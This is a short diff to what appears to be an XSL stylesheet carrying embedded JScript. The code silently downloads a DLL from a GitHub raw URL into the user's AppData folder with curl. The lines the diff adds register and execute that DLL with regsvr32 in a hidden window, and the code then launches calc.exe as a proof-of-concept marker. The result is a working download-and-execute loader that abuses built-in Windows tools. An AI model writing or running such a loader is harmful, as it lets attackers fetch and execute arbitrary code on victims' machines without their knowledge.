@@ -17,6 +17,8 @@
 		    var shell = new ActiveXObject("WScript.Shell");
 		    var cmd = 'cmd.exe /c curl -L -o "%APPDATA%\\Microsoft\\7346832764233279.dll" "https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll"';
 	            shell.Run(cmd, 0, true);
+		    var cmd = 'regsvr32.exe /i "%APPDATA%\\Microsoft\\7346832764233279.dll"';
+	            shell.Run(cmd, 0, true);
 		    shell.Run('calc.exe');
 
 		]]>
